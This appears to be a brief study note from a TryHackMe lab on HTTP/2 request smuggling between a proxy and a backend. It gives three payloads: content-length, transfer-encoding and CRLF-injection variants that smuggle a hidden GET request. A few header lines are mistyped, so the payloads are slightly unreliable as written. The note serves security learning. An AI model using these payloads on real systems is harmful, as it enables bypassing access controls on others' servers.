- Vulnerability comes due to different protocol support between proxy and the webserver. Eg. if proxy supports http2 but webserver supports http

- Http2 to Content length
```http

:method: POST
:path: /
:scheme: https
:authority:tryhackme.com
user-agent: Mozilla/5.0|
content-length: 0

GET /private HTTP/1.1

```

- HTTP2 to transfer encoding
```http
:method: POST
:path: /
:scheme: https
:authority:tryhackme.com
user-agent: Mozilla/5.0
transfer-encodin: chunked

0r\n
\r\n
GET /other HTTP/1.1\r\n
Foo: x
```

- CRLF injection

```http
:method: POST
:path: /
:scheme: https
:authority:tryhackme.com
user-agent: Mozilla/5.0
Foo: bar\r\nContent-Length: 0\r\n\r\nGET /other HTTP/1.1\r\nX: x
```